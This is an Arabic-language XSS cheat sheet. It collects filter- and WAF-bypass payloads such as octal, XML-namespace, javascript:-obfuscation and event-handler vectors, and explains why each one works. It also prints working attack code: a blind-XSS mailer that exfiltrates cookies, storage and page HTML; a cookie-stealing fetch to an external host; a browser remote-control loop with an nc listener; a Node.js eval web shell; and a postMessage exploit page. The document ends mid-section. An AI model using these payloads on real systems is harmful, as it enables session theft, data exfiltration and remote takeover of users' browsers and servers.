{ #XSS_ecoded_payload /  #XSS_DOM}
**الشرح البسيط:**
يُستخدم عندما تُعكس البيانات في كود المصدر لكنها تُدرج في DOM بدون تنفيذ مباشر. يُستخدم ترميز أوكتال لتجاوز مرشحات المتصفح وWAF.

**مثال يعمل:**
- `\74svg o\156load\75alert\501\51\76`: يُرمز `<svg onload=alert(1)>` بأوكتال (`\74` = `<`، `\156` = `n`، إلخ).

**لماذا يعمل؟**
- الترميز الأوكتال يُضلل مرشحات المتصفح وWAF.
- يُدرج في DOM كـ `<svg onload=alert(1)>` ويُنفذ.
- يتجاوز التصفية من طرف العميل.

**الخلاصة:**
إدراج DOM باستخدام `\74svg o\156load\75alert\501\51\76` فعال لأنه يستخدم ترميز أوكتال لتجاوز المرشحات.

---

## **10. ناقل قائم على XML للتجاوز (XML-Based Vector for Bypass)**
{ #XSS_uploud_file / #XSS_Idea_for_script_tag }
**الشرح البسيط:**
يُستخدم في صفحات XML (مثل `text/xml`) لتجاوز مرشحات المتصفح وWAF. يُستخدم مع أسماء فضاء مخصصة، مع إضافة `-->` أو `]]>` إذا كنت داخل تعليق أو CDATA.

**مثال يعمل:**
- `<_:script xmlns:_="http://www.w3.org/1999/xhtml">alert(1)</_:script>`: يُنفذ JavaScript في سياق XML.
- `--> <_:script xmlns:_="http://www.w3.org/1999/xhtml">alert(1)</_:script>`: داخل تعليق XML.
- `]]> <_:script xmlns:_="http://www.w3.org/1999/xhtml">alert(1)</_:script>`: داخل CDATA.

**لماذا يعمل؟**
- أسماء الفضاء المخصصة (`_:script`) تُفسر كـ `<script>` في XML.
- يتجاوز مرشحات المتصفح وWAF في صفحات XML.
- `<script>` يُنفذ JavaScript مباشرة.

**الخلاصة:**
ناقل XML باستخدام `<_:script>alert(1)</_:script>` فعال لأنه يستغل سياق XML ويتجاوز المرشحات.

---

## **11. حقن كود JavaScript – تجاوز IE11/Edge (Javascript Context - Code Injection)**
{ #with_out_Parentheses_bracket }
**الشرح البسيط:**
يُستخدم لتجاوز مرشحات IE11 أو Edge عند الحقن في سياق JavaScript باستخدام معالج `onerror`.

**مثال يعمل:**
- `';onerror=alert;throw 1//`: يُلقي خطأ يُنفذ `alert` عبر `onerror`.

**لماذا يعمل؟**
- `throw` يُلقي خطأ يُلتقط بواسطة `onerror`.
- يتجاوز مرشحات IE11/Edge التي تمنع الحقن المباشر.
- يعمل في سياقات JavaScript.

**الخلاصة:**
تجاوز IE11/Edge في JavaScript باستخدام `';onerror=alert;throw 1//` فعال لأنه يستغل `onerror` و`throw`.

---

## **12. حقن علامة HTML – تجاوز IE11/Edge (HTML Context - Tag Injection)**
{ #XSS_Idea_for_script_tag /  #XSS_with_out_alret /   #XSS_Idea_for_SVG_tag}
**الشرح البسيط:**
يُستخدم لتجاوز مرشحات IE11/Edge في سيناريوهات انعكاس متعدد باستخدام `<svg>` و`<script>`.

**مثال يعمل:**
- `"'>confirm(1)</script><svg><script/1='`: يُغلق الخاصية، يُنفذ `confirm(1)`، ويستخدم `<svg>` لتضليل المرشح.

**لماذا يعمل؟**
- الانعكاس المتعدد يُنشئ سياقًا معقدًا يُصعب تصفيته.
- `<svg>` و`<script>` يُضللان مرشحات IE11/Edge.
- `confirm(1)` يُنفذ كبديل لـ `alert`.

**الخلاصة:**
تجاوز IE11/Edge في HTML باستخدام `"'>confirm(1)</script><svg><script/1='` فعال لأنه يستغل انعكاس متعدد و`<svg>`.

---

## **13. تشويش بروتوكول JavaScript الزائف (Javascript Pseudo-Protocol Obfuscation)**
{ #ideas_for_url }
**الشرح البسيط:**
يُستخدم لتجاوز المرشحات التي تبحث عن `javascript:alert(1)` بكتابة `javascript:` بصيغ غير قياسية. يُختبر أولاً بـ `javascript:1`.

**أمثلة تعمل:**
- `javascript:1`: الصيغة الأساسية.
- `javascript :alert(1)`: يُضيف مسافة.
- `javas%0Dcript:alert(1)`: يُضيف فاصلة إرجاع.
- `%00javascript:alert(1)`: يُضيف بايت فارغ.
- `"javas%0Dcript:alert(1)"`: في سياق DOM.

**لماذا يعمل؟**
- الصيغ غير القياسية تُضلل مرشحات `javascript:` .
- المتصفحات تقبل تنسيقات متعددة لـ `javascript:` .
- يتطلب URL صغير أو DOM Manipulation في بعض الحالات.
##### كل البايلود للفكره دي :
```javascript
&#1javascript:1
javascript&colon:1
javascript&#9:1
```
**الخلاصة:**
تشويش `javascript:` باستخدام `javas%0Dcript:alert(1)` فعال لأنه يُضلل مرشحات البروتوكول.

---
## 1. استدعاء سكربت خارجي (Remote Endpoint Call)
{  #XSS_other_idea }
**الشرح البسيط:**
يُستخدم لتحميل سكربت خارجي عندما يكون ناقل XSS قائمًا على معالج (مثل `<svg onload=...>`) أو حقن JavaScript. يمكن استخدام طرق مثل `XMLHttpRequest`، `fetch`، أو jQuery، مع التعامل مع CORS.

**الأكواد:**

- **HTML (يتطلب CORS):**
  ```
  "var x=new XMLHttpRequest();x.openInfo('GET','http://example.com/0.php');x.sendInfo();
      x.onreadystatechange=action(){if(this.readyState==2){log(x.responseText)}}"
  fetch('http://example.com/0.php').then(r=>{r.text().then(w=>{log(w)})})
  ```

- **مع jQuery:**
  ```
  $.get('http://example.com/0.php',r=>{log(r)})
  ```

- **JavaScript (يتطلب رد JavaScript):**
  ```
  with(document)body.appendChild(createElement('script')).src='http://example.com/2.js'
  $.getScript('http://example.com/2.js')
  import('http://example.com/file')
  ```

**لماذا يعمل؟**
- `XMLHttpRequest` و`fetch` يسمحان بجلب محتوى خارجي إذا سمح CORS.
- jQuery يُبسط جلب السكربتات.
- `<script>` ديناميكي أو `import` يُنفذ JavaScript خارجي مباشرة.

**الخلاصة:**
استدعاء سكربت خارجي باستخدام الأكواد أعلاه فعال لأنه يستغل CORS أو تحميل `<script>` لتنفيذ كود خارجي.

---

## 2. تضمين XSS خارجي غير مرئي (Invisible Foreign XSS Embedding)
{ #XSS--ALL--Event--Payload }
**الشرح البسيط:**
يُستخدم لتحميل XSS من نطاق آخر (أو نطاق فرعي) في السياق الحالي باستخدام `<iframe>` غير مرئي. يقتصر على عدم وجود رأس X-Frame-Options (XFO) صارم.

**الكود:**
```
<iframe src="http://example.com/xss.php?a=<svg onload=alert(document.domain)>" style=display:none></iframe>
```

**لماذا يعمل؟**
- `<iframe>` يُحمل صفحة خارجية تحتوي على XSS.
- `style=display:none` يجعل الإطار غير مرئي.
- يعمل إذا لم يمنع XFO التحميل.

**الخلاصة:**
تضمين XSS خارجي باستخدام الكود أعلاه فعال لأنه يُنفذ XSS في سياق النطاق الهدف عبر `<iframe>` غير مرئي.

---

## 3. تشويه افتراضي بسيط (Simple Virtual Defacement)
{ #XSS_DOM }
**الشرح البسيط:**
يُستخدم لتغيير مظهر الموقع للضحية باستبدال محتوى الصفحة بـ HTML جديد، مثل عرض رسالة "غير موجود".

**الكود:**
```
document.documentElement.innerHTML='<h1>Not Found</h1>'
```

**لماذا يعمل؟**
- `document.documentElement.innerHTML` يُعدل محتوى الصفحة بالكامل.
- يُنفذ على جانب العميل، مما يؤثر على عرض الضحية فقط.
- يتجاوز الحماية إذا لم يكن هناك تنظيف لـ DOM.

**الخلاصة:**
التشويه الافتراضي باستخدام الكود أعلاه فعال لأنه يُغير محتوى الصفحة مباشرة عبر DOM.

---

## 4. بريد XSS أعمى (Blind XSS Mailer)
{ #XSS_exploit  }
**الشرح البسيط:**
يُستخدم كسكربت خارجي لإرسال بيانات الضحية (مثل الكوكيز، URL، التخزين المحلي) إلى بريد إلكتروني عبر خادم PHP يتطلب خادم بريد (مثل Postfix).

**الكود:**
```
<?php header("Content-type: application/javascript"); ?>
var mailer = '<?= "//" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"] ?>';
var msg = 'USER AGENT\n' + navigator.userAgent + '\n\nTARGET URL\n' + document.URL;
msg += '\n\nREFERRER URL\n' + document.referrer + '\n\nREADABLE COOKIES\n' + document.cookie;
msg += '\n\nSESSION STORAGE\n' + JSON.stringify(sessionStorage) + '\n\nLOCAL STORAGE\n' + JSON.stringify(localStorage);
msg += '\n\nFULL DOCUMENT\n' + document.documentElement.innerHTML;
var r = new XMLHttpRequest();
r.open('POST', mailer, true);
r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
r.send('origin=' + document.location.origin + '&msg=' + encodeURIComponent(msg));
<?php
header("Access-Control-Allow-Origin: " . $_POST["origin"]);
$origin = $_POST["origin"];
$to = "myName@myDomain";
$subject = "XSS Blind Report for " . $origin;
$ip = "Requester: " . $_SERVER["REMOTE_ADDR"] . "\nForwarded For: ". $_SERVER["HTTP_X_FORWARDED_FOR"];
$msg = $subject . "\n\nIP ADDRESS\n" . $ip . "\n\n" . $_POST["msg"];
$headers = "From: report@myDomain" . "\r\n";
if ($origin && $msg) mail($to, $subject, $msg, $headers);
?>
```

**لماذا يعمل؟**
- يجمع بيانات حساسة (كوكيز، تخزين، HTML) ويرسلها عبر POST.
- خادم PHP يُعالج الطلب ويرسل بريدًا إلكترونيًا.
- CORS يسمح بالتواصل عبر النطاقات.

**الخلاصة:**
بريد XSS أعمى باستخدام الكود أعلاه فعال لأنه يُرسل بيانات الضحية إلى بريد إلكتروني عبر PHP.

---

## 5. التحكم عن بُعد في المتصفح (Browser Remote Control)
{ #XSS_exploit  }
**الشرح البسيط:**
يُستخدم للتحكم في متصفح الضحية بإرسال أوامر JavaScript تفاعلية عبر اتصال شبكي. يتطلب خادم استماع (listener) على جهاز المهاجم.

**الأكواد:**

- **JavaScript (الحمولة):**
  ```
  setInterval(function(){with(document)body.appendChild(createElement('script')).src='http://HOST:5855'},100)
  ```

- **الاستماع (أمر طرفية):**
  ```
  $ while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
  ```

**لماذا يعمل؟**
- `setInterval` يُحمل سكربتات من HOST كل 100 مللي ثانية.
- أمر `nc` يُنشئ خادمًا يُرسل الأوامر إلى المتصفح.
- يسمح بتنفيذ أوامر ديناميكية في متصفح الضحية.

**الخلاصة:**
التحكم في المتصفح باستخدام الأكواد أعلاه فعال لأنه يُنشئ قناة تفاعلية لإرسال أوامر JavaScript.

---

## 1. ويب شيل Node.js (Node.js Web Shell)
{ #XSS_exploit  }
**الشرح البسيط:**
يُستخدم لإنشاء ويب شيل في تطبيقات Node.js المعرضة للثغرات. يُنشئ خادمًا ينفذ أوامر Node.js عبر طلبات HTTP.

**الكود:**
```
require('http').createServer(function(req,res){res.end(1);eval(require('url').parse(req.url,1).query.cmd)}).listen(5855)
```

**مثال استخدام:**
```
http://target:5855/?cmd=require('child_process').exec('gnome-calculator')
```

**لماذا يعمل؟**
- يُنشئ خادم HTTP على المنفذ 5855.
- ينفذ أوامر Node.js من معلمة `cmd` في URL.
- يمكن تنفيذ أوامر مثل تشغيل برامج (مثل الآلة الحاسبة).

**الخلاصة:**
ويب شيل Node.js باستخدام الكود أعلاه فعال لأنه يُنشئ خادمًا ينفذ أوامر Node.js عبر طلبات HTTP.

---

## 2. سرقة الكوكيز (Cookie Stealing)
{ #XSS_exploit  }
**الشرح البسيط:**
يُستخدم لسرقة كوكيز المستخدم من الموقع الهدف. لا يعمل مع الكوكيز المحمية بـ `httpOnly`. يُرمز `+` إلى `%2B` في URLs.

**الكود:**
```
fetch('http://example.com/?c='+document.cookie)
```

**لماذا يعمل؟**
- `fetch` يُرسل الكوكيز إلى نطاق خارجي.
- `document.cookie` يجمع الكوكيز غير المحمية.
- يتجاوز المرشحات إذا لم تُحظر طلبات `fetch`.

**الخلاصة:**
سرقة الكوكيز باستخدام الكود أعلاه فعال لأنه يُرسل الكوكيز غير المحمية إلى خادم المهاجم.

---

## 3. صفحة اختبار XSS عبر الإنترنت (XSS Online Test Page)
{ #XSS_other_idea }
**الشرح البسيط:**
يُستخدم لممارسة ناقلات وحمولات XSS. تحتوي على نقاط حقن في كود المصدر.

**الرابط:**
```
https://example.com/xss.php
```

**لماذا يعمل؟**
- توفر بيئة آمنة لاختبار XSS.
- يمكن فحص الكود المصدري لتحديد نقاط الحقن.
- مفيد للتعلم والتجربة.

**الخلاصة:**
صفحة الاختبار `https://example.com/xss.php` فعالة لأنها توفر بيئة لتجربة ناقلات XSS.

---

## 4. جدول كيانات HTML (HTML Entities Table)
{ #XSS_ecoded_payload }
**الشرح البسيط:**
يُستخدم لترميز أحرف HTML لتجاوز المرشحات.

**الرابط:**
```
https://example.com/utils/charref.htm
```

**لماذا يعمل؟**
- يوفر ترميزات HTML (مثل `&lt;` لـ `<`).
- يساعد في إنشاء حمولات XSS مشفرة.
- مفيد لتجاوز مرشحات التعقيم.

**الخلاصة:**
جدول كيانات HTML باستخدام الرابط أعلاه فعال لأنه يساعد في ترميز الأحرف لتجاوز المرشحات.

---

## 5. حقن HTML متعدد الحالات (Multi-Case HTML Injection)
{ #XSS_Idea_for_script_tag / #XSS_with_out_alret  }
**الشرح البسيط:**
يُستخدم كحمولة شاملة لزيادة معدل نجاح XSS في سياقات HTML وJavaScript. يعمل في جميع الحالات مع دعم التعقيم البسيط.

**الكود:**
```
</Script/"'--><Body /Autofocus /OnFocus = confirm`1` <!--> 
```

**لماذا يعمل؟**
- يغلق علامات `<script>` وخصائص HTML.
- يستخدم `confirm` بدلاً من `alert`.
- المسافات و`-->` يتجاوزان التعقيم البسيط.

**الخلاصة:**
حقن متعدد الحالات باستخدام الكود أعلاه فعال لأنه يعمل في سياقات متعددة ويتجاوز التعقيم.

---

## 6. حقن HTML متعدد الحالات - Base64 (Multi-Case HTML Injection - Base64)
{ #XSS_ecoded_payload }
**الشرح البسيط:**
يُستخدم في حقول الإدخال التي تتوقع Base64، كحمولة شاملة لـ XSS في سياقات HTML وJavaScript.

**الكود:**
```
PC9TY3JpcHQvIictLT48Qm9keSAvQXV0b2ZvY3VzIC9PbkZvY3VzID0gY29uZmlybWAxYCA8IS0tPg==
```

**لماذا يعمل؟**
- يُرمز الكود السابق (`</Script/"'--><Body /Autofocus /OnFocus = confirm`1` <!-->`) إلى Base64.
- يُفك الترميز إلى HTML صالح عند المعالجة.
- يتجاوز مرشحات Base64 غير المُنظفة.

**الخلاصة:**
حقن Base64 باستخدام الكود أعلاه فعال لأنه يُرمز XSS إلى Base64 لتجاوز المرشحات.

---

## 7. ناقلات لأطوال إدخال ثابتة (Vectors for Fixed Input Length)
{ #XSS_ecoded_payload }
**الشرح البسيط:**
يُستخدم عندما يكون الإدخال مقيدًا بطول ثابت، مثل هاشات MD5، SHA1، أو SHA256.

**الأكواد:**
```
MD5: 12345678901<svg/onload=alert(1)>
SHA1: 1234567890123456789<svg/onload=alert(1)>
SHA256: 1234567890123456789012345678901234567890123<svg/onload=alert(1)>
```

**لماذا يعمل؟**
- يُملأ الإدخال بحروف/أرقام لتطابق الطول المطلوب.
- `<svg onload=alert(1)>` يُنفذ XSS ضمن الحد.
- يتجاوز مرشحات الطول الثابت.

**الخلاصة:**
ناقلات الأطوال الثابتة باستخدام الأكواد أعلاه فعالة لأنها تُنفذ XSS ضمن قيود الطول.

---

## 8. تعقيم PHP لـ XSS (PHP Sanitizing for XSS)
{ #XSS_DOM  / #XSS_other_idea }
**الشرح البسيط:**
يُستخدم لمنع XSS في سياقات المصدر (غير DOM) بشرط عدم انعكاس المدخلات في سلاسل غير محددة أو دوال مثل `eval`.

**الكود:**
```
$input = preg_replace("/:|\\\/", "", htmlentities($input, ENT_QUOTES))
```

**لماذا يعمل؟**
- `htmlentities` يُرمز الأحرف الخاصة (مثل `<` إلى `&lt;`).
- `preg_replace` يُزيل `:` و`\` لمنع بروتوكولات مثل `javascript:`.
- لا يحمي من XSS قائم على DOM.

**الخلاصة:**
تعقيم PHP باستخدام الكود أعلاه فعال لمنع XSS في سياقات المصدر غير DOM.

---

## 9. تأخير تنفيذ JavaScript (JavaScript Execution Delay)
**الشرح البسيط:**
يُستخدم عندما تتطلب الحمولة تحميل مكتبة (مثل jQuery) قبل التنفيذ.

**الأكواد:**
```
onload=function(){$.getScript('http://example.com/2.js')}
onload=x=>$.getScript('http://example.com/2.js')
```

**لماذا يعمل؟**
- `onload` ينتظر تحميل الصفحة.
- يُؤخر تنفيذ `$.getScript` حتى تتوفر المكتبة.
- يتجاوز أخطاء تحميل الموارد.

**الخلاصة:**
تأخير التنفيذ باستخدام الأكواد أعلاه فعال لأنه يضمن تحميل الموارد قبل تنفيذ XSS.

---

## 10. ناقلات الصور - معالجات أحداث بديلة (Image Vectors - Alternative Event Handlers)
{ #XSS--ALL--Event--Payload  }
**الشرح البسيط:**
يُستخدم لتنشيط XSS عبر `<img>` أو `<image>` بمعالجات أحداث غير `onerror`.

**الأكواد:**
```
<img src=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs= onload=alert(1)>
<image src=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs= onloadend=alert(1)>
<img srcset=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs= onloadstart=alert(1)>
```

**لماذا يعمل؟**
- معالجات مثل `onload`، `onloadend`، و`onloadstart` قليلًا ما تُحظر.
- صورة Base64 صالحة تُشغل المعالج.
- يتجاوز مرشحات `onerror`.

**الخلاصة:**
ناقلات الصور باستخدام الأكواد أعلاه فعالة لأنها تستخدم معالجات نادرة مع `<img>`.

---

## 11. أقصر XSS (Shortest XSS)
{ #XSS--ALL--Event--Payload  }
**الشرح البسيط:**
يُستخدم عندما يكون الإدخال محدودًا جدًا. يعتمد على تحميل سكربت خارجي عبر `<base>` مع سكربت موجود في المصدر.

**الكود:**
```
<base href=http://knoxss.me>
```

**لماذا يعمل؟**
- `<base>` يُعيد توجيه طلبات السكربت إلى نطاق المهاجم.
- يتطلب سكربت موجود في المصدر.
- قصير جدًا ويتجاوز قيود الطول.

**الخلاصة:**
أقصر XSS باستخدام الكود أعلاه فعال لأنه يُعيد توجيه السكربتات بطول محدود.

---

## 12. معالجات أحداث للجوال فقط (Mobile-only Event Handlers)
{ #XSS--ALL--Event--Payload / #XSS_unique_tags  }
**الشرح البسيط:**
يُستخدم لاستهداف تطبيقات الجوال باستخدام معالجات أحداث خاصة باللمس أو الاتجاه.

**الأكواد:**
```
<html ontouchstart=alert(1)>
<html ontouchend=alert(1)>
<html ontouchmove=alert(1)>
<body onorientationchange=alert(1)>
```

**لماذا يعمل؟**
- معالجات `ontouch*` و`onorientationchange` مدعومة في متصفحات الجوال.
- تُشغل عند التفاعل باللمس أو تغيير اتجاه الجهاز.
- قليلًا ما تُحظر.

**الخلاصة:**
معالجات الجوال باستخدام الأكواد أعلاه فعالة لأنها تستهدف أحداث الجوال النادرة.

---

## 13. علامة Body (Body Tag)
{ #XSS--ALL--Event--Payload / #XSS_unique_tags }
**الشرح البسيط:**
مجموعة من ناقلات `<body>` بمعالجات أحداث متنوعة. بعضها يعمل فقط في Internet Explorer.

**الأكواد:**
```
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<body onhashchange=alert(1)><meta content=URL;%23 http-equiv=refresh>
<body onscroll=alert(1) style=overflow:auto;height:1000px id=x>#x
<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><x id=x>#x
<body onresize=alert(1)>press F12!
<body onhelp=alert(1)>press F1! // Internet Explorer فقط
```

**لماذا يعمل؟**
- معالجات مثل `onload`، `onscroll`، و`onresize` مدعومة وقليلًا ما تُحظر.
- بعضها يتطلب تفاعل (مثل التمرير أو F12).
- `onhelp` خاص بـ IE.

**الخلاصة:**
ناقلات `<body>` باستخدام الأكواد أعلاه فعالة لأنها تستخدم معالجات متنوعة في علامة `<body>`.

---

## 1. ناقلات XSS أقل شهرة (Less Known XSS Vectors)
{ #XSS--ALL--Event--Payload / #XSS_unique_tags  }
**الشرح البسيط:**
مجموعة من ناقلات XSS غير شائعة تستخدم علامات ومعالجات أحداث نادرة لتنفيذ JavaScript.

**الأكواد:**
```
<marquee onstart=alert(1)>
<audio src onloadstart=alert(1)>
<video onloadstart=alert(1)><source>
<video ontimeupdate=alert(1) controls src=//example.com/x.mp4>
<input autofocus onblur=alert(1)>
<keygen autofocus onfocus=alert(1)>
<form onsubmit=alert(1)><input type=submit>
<select onchange=alert(1)><option>1<option>2
<menu id=x contextmenu=x onshow=alert(1)>right click me!
<object onerror=alert(1)>
```

**لماذا يعمل؟**
- علامات مثل `<marquee>`، `<audio>`، و`<keygen>` قليلًا ما تُراقب.
- معالجات مثل `onstart`، `onblur`، و`onshow` نادرًا ما تُحظر.
- بعضها يتطلب تفاعل المستخدم (مثل النقر أو فقدان التركيز).

**الخلاصة:**
ناقلات أقل شهرة باستخدام الأكواد أعلاه فعالة لأنها تستخدم علامات ومعالجات نادرة تتجاوز المرشحات.

---

## 2. إثبات مفهوم بديل - هز الصفحة (Alternative PoC - Shake Your Body)
{ #XSS_other_idea }
**الشرح البسيط:**
يُستخدم لإنشاء تأثير بصري يهز عناصر الصفحة لإثبات وجود ثغرة XSS.

**الكود:**
```
setInterval(x=>{b=document.body.style,b.marginTop=(b.marginTop=='4px')?'-4px':'4px';},5)
```

**لماذا يعمل؟**
- `setInterval` يُغير `marginTop` للجسم كل 5 مللي ثانية.
- يُنشئ تأثير اهتزاز واضح.
- لا يتطلب علامات HTML، لذا يتجاوز مرشحات العلامات.

**الخلاصة:**
هز الصفحة باستخدام الكود أعلاه فعال لأنه يُظهر الثغرة بتأثير بصري واضح.

---

## 3. إثبات مفهوم بديل - Brutality (Alternative PoC - Brutality)
{ #XSS--ALL--Event--Payload }
**الشرح البسيط:**
يُستخدم لعرض صورة شخصية Sub-Zero من لعبة Mortal Kombat مع صوت "Brutality" لإثبات الثغرة.

**الكود:**
```
d=document,i=d.createElement('img');i.src='//example.com/brutality.jpg';
d.body.insertBefore(i,d.body.firstChild);new(Audio)('//example.com/brutality.mp3').play();
```

**لماذا يعمل؟**
- يُنشئ `<img>` ويُضيف صورة خارجية.
- يشغل صوت MP3 عبر كائن `Audio`.
- يُظهر تأثيرًا بصريًا وسمعيًا واضحًا.

**الخلاصة:**
إثبات Brutality باستخدام الكود أعلاه فعال لأنه يُظهر الثغرة بصورة وصوت لافتين.

---

## 4. إثبات مفهوم بديل - تنبيه القيم المخفية (Alternative PoC - Alert Hidden Values)
{ #XSS_with_out_alret /  #XSS_other_idea }
**الشرح البسيط:**
يُستخدم لإثبات أن القيم المخفية (مثل التوكنات أو nonces) في الصفحة يمكن سرقتها.

**الكود:**
```
f=document.forms;for(i=0;i<f.length;i++){e=f[i].elements;for(n in e){if(e[n].type=='hidden'){alert(e[n].name+': '+e[n].value)}}}
```

**لماذا يعمل؟**
- يمر عبر النماذج (`forms`) ويستخرج الحقول المخفية (`type='hidden'`).
- يعرض الاسم والقيمة عبر `alert`.
- يُظهر مخاطر سرقة البيانات الحساسة.

**الخلاصة:**
تنبيه القيم المخفية باستخدام الكود أعلاه فعال لأنه يكشف القيم الحساسة في النماذج.

---

## 5. تحسين احتمالية أحداث الفأرة (Improved Likelihood of Mouse Events)
{ #XSS--ALL--Event--Payload }
**الشرح البسيط:**
يُستخدم لزيادة مساحة التفاعل مع أحداث الفأرة (مثل `onmouseover`) بتكبير منطقة العنصر.

**الكود:**
```
style=position:fixed;top:0;left:0;font-size:999px
```

**مثال مدمج:**
```
<x onmouseover=alert(1) style=position:fixed;top:0;left:0;font-size:999px>
```

**لماذا يعمل؟**
- `position:fixed` يُثبت العنصر في الصفحة.
- `font-size:999px` يُكبر المنطقة القابلة للتفاعل.
- يُسهل تفعيل الحدث دون دقة.

**الخلاصة:**
تحسين أحداث الفأرة باستخدام الكود أعلاه فعال لأنه يُكبر منطقة التفاعل.

---

## 6. بديل لعلامة Style (Alternative to Style Tag)
{ #XSS_other_idea / #XSS--ALL--Event--Payload }
**الشرح البسيط:**
يُستخدم عندما يتم حظر كلمة `style` (كعلامة أو خاصية). يُحمل CSS خارجي أو مضمن عبر `<link>`.

**الأكواد:**
```
<link rel=stylesheet href=//HOST/FILE>
<link rel=stylesheet href=data:text/css,CSS>
```

**لماذا يعمل؟**
- `<link rel=stylesheet>` يُحمل CSS دون الحاجة إلى `<style>`.
- `data:text/css` يسمح بإدراج CSS مضمن.
- يتجاوز مرشحات `style`.

**الخلاصة:**
بديل `<style>` باستخدام الأكواد أعلاه فعال لأنه يُحمل CSS دون استخدام الكلمة المحظورة.

---

## 7. سكربت عبر النطاقات - CrossPwn (Cross-Origin Script - CrossPwn)
{ #XSS_other_idea }
**الشرح البسيط:**
يُستخدم لإرسال حمولة XSS عبر `postMessage` إلى صفحة هدف باستخدام نطاق فرعي يُحاكي الأصل المسموح.

**الكود:**
```
<!DOCTYPE html>
<body onload="CrossPwn()"> 
<h2>CrossPwn</h2>
<p>OnMessage XSS</p>
<p>Use target & msg as URL parameters.</p>
<iframe id="f" height="0" style="visibility:hidden"></iframe>
<script>
searchParams = new URLSearchParams(document.location.search);
target = searchParams.get('target');
msg = searchParams.get('msg');
document.getElementById('f').setAttribute('src', target);
function CrossPwn() {frames[0].postMessage(msg,'*')}
</script>
</body>
</html>
```

**مثال استخدام:**
```
http://facebook.com.localhost/crosspwn.html?target=//example.com/tests/status.html&msg=<script>alert(document.domain)</script>
```

**لماذا يعمل؟**
- يُحمل الصفحة الهدف في `<iframe>`.
- `postMessage` يُرسل الحمولة إلى الهدف.
- النطاق الفرعي (مثل `facebook.com.localhost`) يُضلل التحقق من الأصل.

**الخلاصة:**
CrossPwn باستخدام الكود أعلاه فعال لأنه يستغل `postMessage` ونطاقات فرعية لإرسال XSS.

---

## 8. حمولات قائمة على الموقع (Location Based Payloads)
{ #XSS--ALL--Event--Payload  / #ideas_for_url}
**الشرح البسيط:**
تستخدم خصائص الوثيقة (مثل `innerHTML` أو `tagName`) لتكوين موقع (`location`) يؤدي إلى تنفيذ JavaScript، مما يُعقد الكشف.

**الأكواد:**

- **أساسيات الموقع:**
  ```
  <j/onmouseover=location=innerHTML>javascript:alert(1)//
  <iframe id=t:alert(1) name=javascrip onload=location=name+id>
  ```

- **الموقع مع جزء URL:**
  ```
  <javascript/onmouseover=location=tagName+innerHTML+location.hash>:/*hoverme!</javascript>#*/alert(1)
  <javascript/onmouseover=location=tagName+innerHTML+location.hash>:'hoverme!</javascript>#'-alert(1)
  <javascript:'-`/onmouseover=location=tagName+URL>hoverme!#`-alert(1)
  <j/onmouseover=location=innerHTML+URL>javascript:'-`hoverme!</j>#`-alert(1)
  <javas/onmouseover=location=tagName+innerHTML+URL>cript:'-`hoverme!</javas>#`-alert(1)
  <javascript:/onmouseover=location=tagName+URL>hoverme!#%0Aalert(1)
  <j/onmouseover=location=innerHTML+URL>javascript:</j>#%0Aalert(1)
  <javas/onmouseover=location=tagName+innerHTML+URL>cript:</javas>#%0Aalert(1)
  ```

**لماذا يعمل؟**
- تستخدم خصائص مثل `innerHTML` و`location.hash` لتكوين `javascript:alert(1)`.
- العلامات المخصصة وعلامات XHTML تُعقد التصفية.
- `#` (جزء URL) يُخفي الحمولة من WAF.

**الخلاصة:**
حمولات الموقع باستخدام الأكواد أعلاه فعالة لأنها تُعقد الكشف باستخدام خصائص الوثيقة وجزء URL.

---

## 1. الموقع مع تنبيه أولي (Location with Leading Alert)
{ #XSS--ALL--Event--Payload  / #ideas_for_url}
**الشرح البسيط:**
تُستخدم هذه الناقلات لتنفيذ XSS عبر خاصية `location` باستخدام خصائص مثل `innerHTML`، `outerHTML`، أو `previousSibling.nodeValue` لتكوين `javascript:alert(1)`، مع إدراج تنبيه أولي لتضليل المرشحات.

**الأكواد:**
```
`-alert(1)<javascript:`/onmouseover=location=tagName+previousSibling.nodeValue>hoverme!
`-alert(1)<javas/onmouseover=location=tagName+innerHTML+previousSibling.nodeValue>cript:`hoverme!
<alert(1)<!--/onmouseover=location=innerHTML+outerHTML>javascript:1/*hoverme!*/</alert(1)<!-->
<j/1="*/""-alert(1)<!--/onmouseover=location=innerHTML+outerHTML>javascript:/*hoverme!
*/"<j/1=/alert(1)//onmouseover=location=innerHTML+previousSibling.nodeValue+outerHTML>javascript:/*hoverme!
```

**لماذا يعمل؟**
- `previousSibling.nodeValue` و`innerHTML` يُستخدمان لتكوين `javascript:alert(1)`.
- العلامات المخصصة (مثل `<javas>`) تُضلل مرشحات العلامات.
- التعليقات (`<!-- -->`) و`hoverme!` يُعقدان الكشف.
- يتطلب تفاعل المستخدم (مثل `onmouseover`).

**الخلاصة:**
ناقلات الموقع مع تنبيه أولي باستخدام الأكواد أعلاه فعالة لأنها تُشكل `javascript:alert(1)` بطريقة معقدة تتجاوز المرشحات.

---

## 2. الموقع مع URL الذاتي (Location with Self URL)
{ #XSS--ALL--Event--Payload  / #ideas_for_url}
**الشرح البسيط:**
تُستخدم لتنفيذ XSS عبر إدراج الحمولة في معلمة URL الضعيفة (`[P]`) واستخدام `location` لإعادة توجيهها إلى `javascript:alert(1)`.

**الأكواد:**
```
<svg id=?[P]=<svg/onload=alert(1)+ onload=location=id>
<j/onmouseover=location=textContent>?[P]=<svg/onload=alert(1)>hoverme!</j>
<j/onmouseover=location+=textContent>&[P]=<svg/onload=alert(1)>hoverme!</j>
<j&[P]=<svg+onload=alert(1)/onmouseover=location+=outerHTML>hoverme!</j&[P]=<svg+onload=alert(1)>
&[P]=<svg/onload=alert(1)><j/onmouseover=location+=document.body.textContent>hoverme!</j>
```

**ملاحظة:**
- استبدل `[P]` بالمعلمة الضعيفة.
- رمز `&` إلى `%26` في URLs.
- الناقل الأخير خاص بـ Firefox.

**لماذا يعمل؟**
- يستغل انعكاس المعلمة `[P]` في URL.
- `textContent` و`outerHTML` يُشكلان الحمولة.
- `<svg>` يُنفذ `alert(1)` عند التحميل.

**الخلاصة:**
